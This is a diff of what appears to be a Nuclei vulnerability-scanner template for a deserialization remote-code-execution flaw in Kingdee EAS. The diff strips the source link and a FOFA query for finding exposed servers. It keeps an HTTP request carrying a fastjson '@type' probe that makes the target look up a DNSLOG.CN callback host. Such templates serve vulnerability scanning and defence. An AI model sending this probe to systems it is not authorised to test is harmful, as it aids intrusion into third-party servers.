@@ -3,12 +3,8 @@ info:
   name: 金蝶 EAS 反序列化 RCE 漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: rce,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="easSessionId" || header="easportal"
 http:
 - raw:
   - GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22DNSLOG.CN%22%7D%7D HTTP/1.1
